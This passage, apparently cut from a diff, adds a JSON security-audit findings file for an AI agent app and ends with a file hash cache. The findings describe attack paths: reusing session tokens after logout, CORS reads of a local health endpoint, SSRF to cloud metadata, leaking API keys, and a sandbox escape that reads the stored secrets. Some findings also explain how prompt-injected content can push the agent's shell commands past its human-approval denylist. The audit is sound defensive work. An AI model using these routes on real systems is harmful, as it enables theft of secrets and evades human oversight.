+      "evidence": "AuthStore.createSessionToken signs {username, issuedAt, expiresAt, version: updatedAt} with sessionSecret, and verifySessionToken checks only signature, expiry, and updatedAt. server.ts:264-268 POST /api/auth/logout only clears the browser cookie and never rotates sessionSecret or records a revoked token/generation.",
+      "runtimeTrigger": "Sign in to obtain a session token (Bearer or nemofy_session cookie), call POST /api/auth/logout, and replay the same token on GET /api/threads or GET /api/filesystem/tree; the request still succeeds with HTTP 200 for up to 24 hours.",
+      "crossReferences": [
+        "server.ts:264-268",
+        "server.ts:149-162"
+      ],
+      "confidenceScore": 93,
+      "confidenceLabel": "high",
+      "stride": "Spoofing",
+      "cwe": "CWE-613",
+      "status": "open",
+      "source": "local-sequential",
+      "updatedAt": "2026-11-21T15:17:03.489Z"
+    },
+    {
+      "key": "server.ts|480-497|Chat send and job-start endpoints persist the user message and newly created thread to disk before validating that a Primary model is configured.",
+      "bugId": "BUG-8",
+      "severity": "Medium",
+      "file": "server.ts",
+      "lines": "480-497",
+      "category": "data-integrity",
+      "claim": "Chat send and job-start endpoints persist the user message and newly created thread to disk before validating that a Primary model is configured.",
+      "evidence": "In POST /api/chat/send (server.ts:480-497) and POST /api/chat/jobs/start (server.ts:695-712), userMsg is pushed onto thread.messages and persisted via store.saveThreads(threads) before checking if (!llmCfg.primary.model.trim()), which then aborts with HTTP 400.",
+      "runtimeTrigger": "Clear the Primary model in Settings, then submit a chat message via POST /api/chat/jobs/start; the server responds with HTTP 400 error, yet reloads show the rejected user message permanently saved (and duplicated on each retry) in data/threads.json.",
+      "crossReferences": [
+        "server.ts:695-712"
+      ],
+      "confidenceScore": 93,
+      "confidenceLabel": "high",
+      "stride": "N/A",
+      "cwe": "N/A",
+      "status": "open",
+      "source": "local-sequential",
+      "updatedAt": "2026-11-21T15:17:03.489Z"
+    },
+    {
+      "key": "Agent-Core/agent_core/api.py|316-327|FastAPI CORSMiddleware defaults to allow_origins=['*'] with allow_credentials=True, reflecting any untrusted Origin header on all endpoints including unauthenticated /health.",
+      "bugId": "BUG-9",
+      "severity": "Medium",
+      "file": "Agent-Core/agent_core/api.py",
+      "lines": "316-327",
+      "category": "security",
+      "claim": "FastAPI CORSMiddleware defaults to allow_origins=['*'] with allow_credentials=True, reflecting any untrusted Origin header on all endpoints including unauthenticated /health.",
+      "evidence": "Agent-Core/agent_core/api.py:316-327 defaults CORS_ALLOW_ORIGINS to '*' while setting allow_credentials=True. In Starlette CORSMiddleware, wildcard origin combined with allow_credentials=True reflects the request Origin header with Access-Control-Allow-Credentials: true. GET /health (lines 384-420) has no authentication and returns host workspace_dir, checkpoint.path, config_path, and MCP tool names.",
+      "runtimeTrigger": "Any malicious website visited by a developer running Nemofy Agent locally executes fetch('http://127.0.0.1:8100/health', {credentials:'include'}) and reads the JSON response containing local filesystem paths, configured models, and MCP server metadata.",
+      "crossReferences": [
+        "Agent-Core/agent_core/api.py:384-420"
+      ],
+      "confidenceScore": 88,
+      "confidenceLabel": "high",
+      "stride": "InfoDisclosure",
+      "cwe": "CWE-942",
+      "status": "open",
+      "source": "local-sequential",
+      "updatedAt": "2026-11-21T15:17:03.489Z"
+    },
+    {
+      "key": "Agent-Core/agent_core/context_manager.py|582-597|find_safe_compaction_split orphans trailing ToolMessages when a turn ends with multiple parallel tool results, producing an invalid message history that LLM providers reject.",
+      "bugId": "BUG-10",
+      "severity": "High",
+      "file": "Agent-Core/agent_core/context_manager.py",
+      "lines": "582-597",
+      "category": "data-integrity",
+      "claim": "find_safe_compaction_split orphans trailing ToolMessages when a turn ends with multiple parallel tool results, producing an invalid message history that LLM providers reject.",
+      "evidence": "In Agent-Core/agent_core/context_manager.py:583-584, the loop advances candidate while candidate < n - 1 and isinstance(messages[candidate], ToolMessage), stopping at candidate = n - 1 when messages[n - 1] is a ToolMessage. Lines 588-593 then check only whether messages[candidate - 1] is an AIMessage; when an AIMessage invoked >= 2 tools in parallel, messages[candidate - 1] is another ToolMessage, so candidate stays at n - 1 and is returned at line 597. compact_conversation_history (lines 686-691) therefore compacts the AIMessage and earlier ToolMessages while leaving messages[n - 1] as an orphaned ToolMessage.",
+      "runtimeTrigger": "During a single-turn or multi-tool run where context usage hits >= 80% after an AIMessage with 2+ parallel tool_calls (e.g., [HumanMessage, AIMessage(tc1, tc2), ToolMessage(tc1), ToolMessage(tc2)]), find_safe_compaction_split computes candidate=2, advances to 3, skips the line 588 check because messages[2] is a ToolMessage, and returns 3. The next LLM call sends [ToolMessage(tc2)] without its preceding AIMessage(tool_calls), failing with provider HTTP 400 invalid tool message sequence.",
+      "crossReferences": [
+        "Agent-Core/agent_core/context_manager.py:674-691",
+        "Agent-Core/agent_core/graph.py:1946-1975"
+      ],
+      "confidenceScore": 96,
+      "confidenceLabel": "high",
+      "stride": "N/A",
+      "cwe": "N/A",
+      "status": "open",
+      "source": "unknown",
+      "updatedAt": "2026-11-21T16:44:41.306Z"
+    },
+    {
+      "key": "Agent-Core/agent_core/models.py|1222-1350|list_provider_models and probe_model_connectivity perform SSRF-prone HTTP requests with follow_redirects=True to arbitrary base_url values while attaching server-side provider API keys.",
+      "bugId": "BUG-11",
+      "severity": "High",
+      "file": "Agent-Core/agent_core/models.py",
+      "lines": "1222-1350",
+      "category": "security",
+      "claim": "list_provider_models and probe_model_connectivity perform SSRF-prone HTTP requests with follow_redirects=True to arbitrary base_url values while attaching server-side provider API keys.",
+      "evidence": "Agent-Core/agent_core/models.py:1233-1266 accepts an arbitrary base_url (checking only startswith(('http://','https://')) in list_provider_models and omitting scheme checks in probe_model_connectivity at line 1339), resolves server-side API keys from os.environ via _resolve_api_key when api_key is omitted, attaches them via _build_provider_headers, and opens httpx.AsyncClient(follow_redirects=True) without blocking private/loopback/metadata IP ranges or restricting hostnames.",
+      "runtimeTrigger": "Calling Agent-Core POST /config/models or POST /config/probe (or via Express /api/settings/models and /api/settings/probe) with a known provider name (e.g., openai), an omitted api_key, and a custom base_url pointing to an external collector or internal/metadata service causes Agent-Core to transmit the configured server-side API key to that host or probe internal network services.",
+      "crossReferences": [
+        "Agent-Core/agent_core/api.py:518-552",
+        "server/providerCatalog.ts:288-311"
+      ],
+      "confidenceScore": 93,
+      "confidenceLabel": "high",
+      "stride": "InfoDisclosure",
+      "cwe": "CWE-918",
+      "status": "open",
+      "source": "unknown",
+      "updatedAt": "2026-11-21T16:44:41.307Z"
+    },
+    {
+      "key": "Agent-Core/agent_core/graph.py|2129-2299|act_node executes multiple tool calls sequentially in a loop without idempotency or per-call checkpointing, causing earlier tools (including previously approved sensitive actions) to re-execute when a later tool triggers LangGraph interrupt().",
+      "bugId": "BUG-12",
+      "severity": "High",
+      "file": "Agent-Core/agent_core/graph.py",
+      "lines": "2129-2299",
+      "category": "logic",
+      "claim": "act_node executes multiple tool calls sequentially in a loop without idempotency or per-call checkpointing, causing earlier tools (including previously approved sensitive actions) to re-execute when a later tool triggers LangGraph interrupt().",
+      "evidence": "In Agent-Core/agent_core/graph.py:2129-2299, act_node iterates over all tool_calls in the latest AIMessage and awaits execute_tool_with_guardrails(...) (line 2186), which calls langgraph.types.interrupt(payload) in Agent-Core/agent_core/guardrails.py:367 for SENSITIVE tools. When GraphInterrupt is raised (re-raised at line 2192), LangGraph discards the in-flight node state and, upon Command(resume=...), replays act_node from line 2110. Every tool_call preceding the interrupted call is invoked a second time via tool_obj.ainvoke(validated_args) because none of the side-effecting calls are wrapped in a LangGraph task or tracked across interrupt replay.",
+      "runtimeTrigger": "The LLM emits two tool calls in one turn: either [edit_file('app.py', 'old', 'new'), bash_exec('rm -f temp.log')] or two SENSITIVE calls [send_email(...), bash_exec('rm -f temp.log')]. On first execution, call 0 runs its side effect (mutating app.py or interrupting and then sending the email on resume 1), and call 1 triggers GraphInterrupt. When the human approves call 1, LangGraph replays act_node from the top, re-executing call 0 (failing edit_file because 'old' was already replaced, duplicating bash_exec side effects, or sending the approved email twice).",
+      "crossReferences": [
+        "Agent-Core/agent_core/guardrails.py:367-463"
+      ],
+      "confidenceScore": 94,
+      "confidenceLabel": "high",
+      "stride": "Tampering",
+      "cwe": "N/A",
+      "status": "open",
+      "source": "unknown",
+      "updatedAt": "2026-11-21T16:56:21.417Z"
+    },
+    {
+      "key": "Agent-Core/agent_core/guardrails.py|44-79|bash_exec HITL guardrail relies on a narrow regex denylist and defaults unmatched shell commands to SAFE, allowing destructive file deletion and outbound HTTP mutations without human approval.",
+      "bugId": "BUG-13",
+      "severity": "High",
+      "file": "Agent-Core/agent_core/guardrails.py",
+      "lines": "44-79",
+      "category": "security",
+      "claim": "bash_exec HITL guardrail relies on a narrow regex denylist and defaults unmatched shell commands to SAFE, allowing destructive file deletion and outbound HTTP mutations without human approval.",
+      "evidence": "Agent-Core/agent_core/guardrails.py:132-147 checks bash_exec commands against only 10 regexes in DESTRUCTIVE_BASH_PATTERNS (lines 44-79) and returns safety_level='SAFE' for any non-matching command. Commands such as python3 -c file/directory removal or HTTP POST, find -delete, file truncation via redirection (> file), symlink creation (ln -s), curl -F/--form or -T uploads, or quoted/subshell forms bypass every regex and run automatically without invoking request_human_approval.",
+      "runtimeTrigger": "A prompt-injected or erroneous agent call invokes bash_exec with a destructive or outbound-mutating command that omits the denylisted tokens (for example using python3 -c, find -delete, or curl -T/-F); classify_tool_call returns SAFE and execute_tool_with_guardrails executes the command immediately without triggering HITL approval.",
+      "crossReferences": [
+        "Agent-Core/agent_core/guardrails.py:132-147",
+        "Agent-Core/agent_core/sandbox.py:471-548"
+      ],
+      "confidenceScore": 91,
+      "confidenceLabel": "high",
+      "stride": "ElevationOfPrivilege",
+      "cwe": "CWE-184",
+      "status": "open",
+      "source": "unknown",
+      "updatedAt": "2026-11-21T16:56:21.417Z"
+    },
+    {
+      "key": "Agent-Core/agent_core/tools/local.py|58-106|web_fetch SSRF protection can be bypassed via DNS-resolved private/loopback hostnames or HTTP redirects because _validate_web_url never resolves DNS and fetch_webpage_markdown follows redirects without re-validating targets.",
+      "bugId": "BUG-14",
+      "severity": "High",
+      "file": "Agent-Core/agent_core/tools/local.py",
+      "lines": "58-106",
+      "category": "security",
+      "claim": "web_fetch SSRF protection can be bypassed via DNS-resolved private/loopback hostnames or HTTP redirects because _validate_web_url never resolves DNS and fetch_webpage_markdown follows redirects without re-validating targets.",
+      "evidence": "Agent-Core/agent_core/tools/local.py:58-81 _validate_web_url only rejects literal strings in ('localhost','127.0.0.1','::1','0.0.0.0') or literal private/loopback/link-local IP addresses (silently passing any hostname via except ValueError: pass at lines 78-79). Lines 99-106 then execute httpx.AsyncClient(follow_redirects=True, max_redirects=5).get(validated_url) without re-running _validate_web_url on redirect Location hops or pinning resolved IPs. Because web_fetch is in EXPLICIT_SAFE_TOOLS (guardrails.py:26), it executes without human approval.",
+      "runtimeTrigger": "A prompt-injected webpage or user task instructs the agent to call web_fetch on either (1) a hostname resolving to a loopback/link-local IP (such as a DNS alias for 127.0.0.1 or 169.254.169.254, or an internal service hostname) or (2) a public URL that responds with HTTP 302 Location: http://127.0.0.1:8100/health or http://169.254.169.254/latest/meta-data/. _validate_web_url passes and httpx fetches and returns the internal response body to the agent.",
+      "crossReferences": [
+        "Agent-Core/agent_core/guardrails.py:21-32",
+        "Agent-Core/agent_core/api.py:384-420"
+      ],
+      "confidenceScore": 96,
+      "confidenceLabel": "high",
+      "stride": "InfoDisclosure",
+      "cwe": "CWE-918",
+      "status": "open",
+      "source": "unknown",
+      "updatedAt": "2026-11-21T16:56:21.844Z"
+    },
+    {
+      "key": "Agent-Core/agent_core/sandbox.py|44-49|local_isolated sandbox mode executes bash_exec directly on the host OS using only a 4-regex denylist, allowing trivial sandbox escape to read or overwrite host secrets (auth.json, encrypted vaults, .env) and application code.",
+      "bugId": "BUG-15",
+      "severity": "Critical",
+      "file": "Agent-Core/agent_core/sandbox.py",
+      "lines": "44-49",
+      "category": "security",
+      "claim": "local_isolated sandbox mode executes bash_exec directly on the host OS using only a 4-regex denylist, allowing trivial sandbox escape to read or overwrite host secrets (auth.json, encrypted vaults, .env) and application code.",
+      "evidence": "When Docker is unavailable (the default SANDBOX_BACKEND=auto fallback), Agent-Core/agent_core/sandbox.py:471-516 _exec_local_isolated checks only the 4 static patterns in _LOCAL_ESCAPE_PATTERNS (lines 44-49: docker.sock, /etc/shadow|passwd|sudoers, /proc/<pid>/environ|mem|root, literal .env) and then spawns bash -c directly on the host filesystem with cwd=workspace_dir and no filesystem namespace, chroot, or mount isolation. Paths such as ../data/auth.json (which stores sessionSecret and vaultMasterSecret), ../data/vaults/*.vault.json, ../data/llm_config.json, and obfuscated reads of ../.env are unrestricted.",
+      "runtimeTrigger": "On any deployment running in local_isolated mode, an agent tool call to bash_exec (classified SAFE by guardrails.py) reads ../data/auth.json or ../data/vaults/admin.vault.json via standard shell or Python file I/O (or modifies ../server.ts), completely bypassing workspace confinement and exposing the vault master secret and session signing secret.",
+      "crossReferences": [
+        "Agent-Core/agent_core/sandbox.py:471-516",
+        "Agent-Core/agent_core/guardrails.py:132-147",
+        "server/authStore.ts:44-88",
+        "server/profileVault.ts:74-96"
+      ],
+      "confidenceScore": 95,
+      "confidenceLabel": "high",
+      "stride": "ElevationOfPrivilege",
+      "cwe": "CWE-265",
+      "status": "open",
+      "source": "unknown",
+      "updatedAt": "2026-11-21T16:56:21.846Z"
+    },
+    {
+      "key": "MCPs/manager.py|68-114|MCPServerConfig and load_mcp_tools_from_configs connect to caller-supplied MCP server URLs without URL scheme validation or private/metadata network restrictions (SSRF).",
+      "bugId": "BUG-16",
+      "severity": "Medium",
+      "file": "MCPs/manager.py",
+      "lines": "68-114",
+      "category": "security",
+      "claim": "MCPServerConfig and load_mcp_tools_from_configs connect to caller-supplied MCP server URLs without URL scheme validation or private/metadata network restrictions (SSRF).",
+      "evidence": "MCPs/manager.py:28-33 defines MCPServerConfig.url as an unvalidated string, and lines 79-97 pass srv.url and arbitrary headers directly to MultiServerMCPClient for streamable_http/sse connections without verifying http(s) scheme or blocking loopback, private RFC1918, or cloud metadata (169.254.169.254) addresses. Agent-Core/agent_core/api.py:575-588 and 745 accept per-request mcp_servers straight into load_mcp_tools_from_configs.",
+      "runtimeTrigger": "An authenticated caller configures an MCP server via PUT /api/mcps or passes per-request mcp_servers to Agent-Core with url pointing to an internal host or cloud metadata service; Agent-Core initiates outbound HTTP/SSE requests to that internal target and returns connection diagnostics in warnings.",
+      "crossReferences": [
+        "Agent-Core/agent_core/api.py:575-588",
+        "Agent-Core/agent_core/api.py:745-755",
+        "server.ts:1166-1208"
+      ],
+      "confidenceScore": 87,
+      "confidenceLabel": "high",
+      "stride": "InfoDisclosure",
+      "cwe": "CWE-918",
+      "status": "open",
+      "source": "unknown",
+      "updatedAt": "2026-11-21T16:56:21.846Z"
+    },
+    {
+      "key": "Agent-Core/agent_core/subagents.py|428-508|Isolated sub-agent graphs are compiled without a checkpointer while still propagating LangGraph GraphInterrupt, causing HITL approval resume to restart the sub-agent from scratch instead of resuming at the paused tool call.",
+      "bugId": "BUG-17",
+      "severity": "Medium",
+      "file": "Agent-Core/agent_core/subagents.py",
+      "lines": "428-508",
+      "category": "logic",
+      "claim": "Isolated sub-agent graphs are compiled without a checkpointer while still propagating LangGraph GraphInterrupt, causing HITL approval resume to restart the sub-agent from scratch instead of resuming at the paused tool call.",
+      "evidence": "Agent-Core/agent_core/subagents.py:473 compiles worker_graph = builder.compile() with no checkpointer. Inside worker_act (lines 428-435), execute_tool_with_guardrails calls langgraph.types.interrupt() for SENSITIVE tools and re-raises GraphInterrupt (lines 434, 507) out of spawn_subagent into the parent act_node. When the parent graph resumes with Command(resume=...), LangGraph re-invokes spawn_subagent -> run_isolated_subagent from initial_worker_state (turn_count=0), re-running all earlier worker LLM calls and side-effecting worker tools and risking non-deterministic divergence before reaching the interrupt.",
+      "runtimeTrigger": "The supervisor delegates a multi-step task via spawn_subagent; on turn 2 the worker calls a SENSITIVE tool (e.g., bash_exec with rm or an external MCP mutation), pausing the graph for HITL approval. After the user approves, the parent resumes act_node, which restarts worker_graph from turn 0, re-executing turn 1's LLM call and tool calls rather than resuming turn 2.",
+      "crossReferences": [
+        "Agent-Core/agent_core/guardrails.py:367-463",
+        "Agent-Core/agent_core/graph.py:2185-2193"
+      ],
+      "confidenceScore": 91,
+      "confidenceLabel": "high",
+      "stride": "N/A",
+      "cwe": "N/A",
+      "status": "open",
+      "source": "unknown",
+      "updatedAt": "2026-11-21T16:56:21.846Z"
+    },
+    {
+      "key": "Nemofy Agent/src/components/FilesystemView.tsx|146-166|Creating a new workspace file silently truncates and overwrites any existing file at the same path to 0 bytes because neither FilesystemView nor the workspace file save endpoint checks whether the target file already exists.",
+      "bugId": "BUG-18",
+      "severity": "Medium",
+      "file": "Nemofy Agent/src/components/FilesystemView.tsx",
+      "lines": "146-166",
+      "category": "data-integrity",
+      "claim": "Creating a new workspace file silently truncates and overwrites any existing file at the same path to 0 bytes because neither FilesystemView nor the workspace file save endpoint checks whether the target file already exists.",
+      "evidence": "Nemofy Agent/src/components/FilesystemView.tsx:162-166 implements the 'New file' creation flow by calling saveWorkspaceFile(clean, '') directly without checking whether clean already exists in tree or passing a create-only flag. On the backend, PUT /api/filesystem/file calls writeWorkspaceFile in server/configStore.ts, which writes content directly via fs.writeFileSync without O_EXCL / exclusive creation semantics. After truncating an existing file, line 164 shows 'Created file /workspace/<clean>'.",
+      "runtimeTrigger": "A user opens the Workspace Filesystem view, clicks 'New file', and enters the relative path of an existing file (such as notes.md or src/app.py). handleCreateSubmit calls saveWorkspaceFile(clean, ''), silently wiping the existing file's contents to an empty string with no confirmation or conflict error.",
+      "crossReferences": [
+        "Nemofy Agent/src/lib/apiClient.ts:395-410",
+        "server/configStore.ts:739-749"
+      ],
+      "confidenceScore": 93,
+      "confidenceLabel": "high",
+      "stride": "N/A",
+      "cwe": "N/A",
+      "status": "open",
+      "source": "unknown",
+      "updatedAt": "2026-11-21T17:36:40.709Z"
+    },
+    {
+      "key": "Nemofy Agent/src/components/SettingsView.tsx|880-922|Skill deletion and MCP server mutation handlers omit try/catch error handling, and skill deletion reports success even when the DELETE /api/skills/:name request fails.",
+      "bugId": "BUG-19",
+      "severity": "Medium",
+      "file": "Nemofy Agent/src/components/SettingsView.tsx",
+      "lines": "880-922",
+      "category": "error-handling",
+      "claim": "Skill deletion and MCP server mutation handlers omit try/catch error handling, and skill deletion reports success even when the DELETE /api/skills/:name request fails.",
+      "evidence": "Nemofy Agent/src/components/SettingsView.tsx:880-922 implements handleDeleteSkill, handleAddMcpServer, handleToggleMcp, and handleDeleteMcp without try/catch (unlike handleSaveSkill at lines 864-878). When saveMCPServers throws on a non-OK response (Nemofy Agent/src/lib/apiClient.ts:915), the promise rejects unhandled and the UI displays no error feedback. In handleDeleteSkill (lines 880-890), deleteSkillDocument (apiClient.ts:886-895) ignores !res.ok on DELETE /api/skills/:name, so a server-side failure still reaches line 889 and displays 'Deleted skill \"<name>\"'.",
+      "runtimeTrigger": "An authenticated user attempts to delete a skill or add/toggle/delete an MCP server while the backend returns 400/401/500 or encounters a network error. MCP actions trigger unhandled promise rejections with silent UI failure, and failed skill deletion falsely displays a 'Deleted skill' confirmation banner.",
+      "crossReferences": [
+        "Nemofy Agent/src/lib/apiClient.ts:886-917"
+      ],
+      "confidenceScore": 94,
+      "confidenceLabel": "high",
+      "stride": "N/A",
+      "cwe": "N/A",
+      "status": "open",
+      "source": "unknown",
+      "updatedAt": "2026-11-21T17:36:40.917Z"
+    },
+    {
+      "key": "Nemofy Agent/src/lib/markdownRenderer.ts|289-290|Markdown link matching permits protocol-relative external URLs starting with '//', which bypasses MarkdownMessage's external-link check and renders links to external origins without target=\"_blank\" or rel=\"noopener noreferrer\".",
+      "bugId": "BUG-20",
+      "severity": "Low",
+      "file": "Nemofy Agent/src/lib/markdownRenderer.ts",
+      "lines": "289-290",
+      "category": "security",
+      "claim": "Markdown link matching permits protocol-relative external URLs starting with '//', which bypasses MarkdownMessage's external-link check and renders links to external origins without target=\"_blank\" or rel=\"noopener noreferrer\".",
+      "evidence": "Nemofy Agent/src/lib/markdownRenderer.ts:289-290 defines INLINE_PATTERN with the link URL prefix `(?:https?:\\/\\/|\\/)[^)\\s]+`. Because `\\/` matches `//`, a markdown link `[docs](//external.example/page)` is parsed into a link token with href `//external.example/page`. Nemofy Agent/src/components/MarkdownMessage.tsx:81-83 only checks `tok.href.startsWith('http')` to apply `target=\"_blank\"` and `rel=\"noopener noreferrer\"`, so protocol-relative external links navigate the authenticated app tab off-origin without opener isolation.",
+      "runtimeTrigger": "An agent response (for example, summarizing untrusted fetched web content) includes a markdown link using a protocol-relative URL `[label](//external.example/phish)`. Clicking the link navigates the top-level Nemofy Agent window directly to the external origin instead of opening an isolated tab.",
+      "crossReferences": [
+        "Nemofy Agent/src/components/MarkdownMessage.tsx:77-90"
+      ],
+      "confidenceScore": 90,
+      "confidenceLabel": "high",
+      "stride": "Spoofing",
+      "cwe": "CWE-601",
+      "status": "open",
+      "source": "unknown",
+      "updatedAt": "2026-11-21T17:36:40.917Z"
+    }
+  ],
+  "hashCache": {
+    "Nemofy Agent/src/components/LoginGate.tsx": {
+      "hash": "02591fcf3c42948dd7624a20aedfdac228c735e8866f240165a5256e30551607",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.461Z"
+    },
+    "Nemofy Agent/src/lib/authValidation.ts": {
+      "hash": "a0c2e7dd40b96b3c233a3007da6cbfe2dfba437747656dfc9c40e9316d57431b",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.462Z"
+    },
+    "server.ts": {
+      "hash": "661b613bf82cd34da577a0de7a76352e44b3606efe6d808c768be2a660106309",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.462Z"
+    },
+    "server/agentProcessManager.ts": {
+      "hash": "80b93dbbd43a714d911073b9b68e770928991443afcbc75155b7a17f218ee5c1",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.462Z"
+    },
+    "server/authStore.ts": {
+      "hash": "2ddff5fd008d5c6475afeabc25a1587122734141f5dc94d7f02ce771965b9d25",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.462Z"
+    },
+    "server/configStore.ts": {
+      "hash": "0252c8bf7ddd6e079ee001a4fcc26b9ab4c930c4e5e0545e360b89d3a4a7c369",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.463Z"
+    },
+    "server/profileVault.ts": {
+      "hash": "803b633c39b783130b9f3d494d3ecb514d040e4b0b0a91be7d0113f9f6d4270b",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.463Z"
+    },
+    "server/providerCatalog.ts": {
+      "hash": "70b111e5e30071857d6b089dcf059d9c07879c4d667b516603949a3a93734132",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.463Z"
+    },
+    "Agent-Core/agent_core/api.py": {
+      "hash": "6c4cada1aa13899c9a5a3221bb9cfd0572dddc71a259c78c0dcc11f7aade61c7",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.463Z"
+    },
+    "Agent-Core/agent_core/models.py": {
+      "hash": "26a591cd19bbe16e19ce699dbdc9de8a31f9ba209c13996d78aa5d708c51008d",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.464Z"
+    },
+    "Agent-Core/agent_core/state.py": {
+      "hash": "20b3caec0ab9cb0e1a4e071cdda13d80e549f23e084e82da202ae503f7fef52b",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.464Z"
+    },
+    "Nemofy Agent/src/components/ModelSelectorCombobox.tsx": {
+      "hash": "4e076d6643b6bd59aec67696fca3562b0c8ff56e935a772ca753e1773d2c2800",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.464Z"
+    },
+    "Nemofy Agent/src/lib/apiClient.ts": {
+      "hash": "7c1b141ca97de98490153648fb2fc5fedd279a8ac27f16340f98f3da0066d7cc",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.464Z"
+    },
+    "Agent-Core/agent_core/__init__.py": {
+      "hash": "8b453e27628cc94db8cfd7784e1a39da637dcf0acf247e599740cb2db781d8d5",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.464Z"
+    },
+    "Agent-Core/agent_core/context_manager.py": {
+      "hash": "2df95e82287c2efbc04a21d97809aba3ee408e9ffcff6f4223b250a775e0f065",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.464Z"
+    },
+    "Agent-Core/agent_core/graph.py": {
+      "hash": "67b88bef5125f07515e2e5333745af0d83ba7db40b5f49f5e4fbdd51ba0ff5f4",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.465Z"
+    },
+    "Agent-Core/agent_core/guardrails.py": {
+      "hash": "88fee40212e0a577ab8e4cdc8a8bcdef2dac1b949d086597098d187fe7513021",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.465Z"
+    },
+    "Agent-Core/agent_core/jobs.py": {
+      "hash": "b40c795adf975d995f07126eb997fdf7260df62bcae0d1b2ddcd690d79837ad3",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.465Z"
+    },
+    "Agent-Core/agent_core/multimodal.py": {
+      "hash": "321e79a26cf3af71a53d564a649454cd8be66f1bf785d6d3c124a6009e4feaae",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.465Z"
+    },
+    "Agent-Core/agent_core/planner.py": {
+      "hash": "0dd8c28ae7f14adc0cae73e95d2071ecf6530da8c2b0bb71ec44e3f3ecc96cff",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.465Z"
+    },
+    "Agent-Core/agent_core/sandbox.py": {
+      "hash": "74e10f494c7bee0016fde0cbc1ac3868e30ec31be7f3a20ca364b6f118f19e81",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.466Z"
+    },
+    "Agent-Core/agent_core/skills.py": {
+      "hash": "4b564ab0efb9285b7b7449fbdd29706f575b8ed21fef042373bbe48afbc0a8dd",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.466Z"
+    },
+    "Agent-Core/agent_core/subagents.py": {
+      "hash": "ff2d3682dd35f12fb9361525199c1f1ebf7b25466718549d60dd06cf5aaf5b54",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.466Z"
+    },
+    "Agent-Core/agent_core/tools/__init__.py": {
+      "hash": "4c8600366e1b61f1127a128fbcf13f46be6779b4c0b4d97dcccd9318e0a77906",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.466Z"
+    },
+    "Agent-Core/agent_core/tools/local.py": {
+      "hash": "3892fa34160b96fc3e78757390a1397f5df268bdd7e527a45f76bea8f316394f",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.466Z"
+    },
+    "Agent-Core/main.py": {
+      "hash": "342bc16210dfb78664a9806c9564e3f41a6a9470520349083d305994ca228adb",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.466Z"
+    },
+    "MCPs/__init__.py": {
+      "hash": "4562fbd7b3cce55ee2e26004caa27664c6d6f00a3929f26fe35b0b96eae3a6fc",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.466Z"
+    },
+    "MCPs/manager.py": {
+      "hash": "0d9dc7a89ba378fd65e0959d29c227f18665145c2b8e29704dfcfd2303a42536",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.466Z"
+    },
+    "Nemofy Agent/src/App.tsx": {
+      "hash": "a7df84523f529af7cd1b0c2763756e8ead9b6cc44dbcc2a7ce2a4c8676f3d5e7",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.466Z"
+    },
+    "Nemofy Agent/src/components/AgentActivityPanel.tsx": {
+      "hash": "4b07b5499316c495f1d158b542a9560d2b1da9046bb1ec3a81632628d72f1e81",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.467Z"
+    },
+    "Nemofy Agent/src/components/ChatView.tsx": {
+      "hash": "473a64aeae984fc8c4bcafad590313c63531c9509ad1208f4ff26440b0ed36cc",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.467Z"
+    },
+    "Nemofy Agent/src/components/ContextUsageRing.tsx": {
+      "hash": "a0297498141bc10912fba12647dc2849ea9495b4db56aa5053f4afcd066d5491",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.468Z"
+    },
+    "Nemofy Agent/src/components/FilesystemView.tsx": {
+      "hash": "8d6ddefe0130f8074112de99c5ace8eef43fa7903211be33d890f33f05b9a1f3",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.473Z"
+    },
+    "Nemofy Agent/src/components/MarkdownMessage.tsx": {
+      "hash": "469a50dc70ea71316c6bbfc0907ba9ba57491ab83248b20df03f518eff9aafcf",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.475Z"
+    },
+    "Nemofy Agent/src/components/NemofyLogo.tsx": {
+      "hash": "15757e518e7ca2209ca02ad1a0fa65aa60a080a63a57ffd8372244bb79b897eb",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.476Z"
+    },
+    "Nemofy Agent/src/components/SettingsView.tsx": {
+      "hash": "4a3d065809728b2b08cc9d5b5a5fba9c93d6d12e6a8e3dd248df5923a146e23b",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.477Z"
+    },
+    "Nemofy Agent/src/components/Sidebar.tsx": {
+      "hash": "ce95b7b072f32620bbaaa1369538636a472461177e7a83e2ff2fec9642eaec06",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.477Z"
+    },
+    "Nemofy Agent/src/lib/activityUtils.ts": {
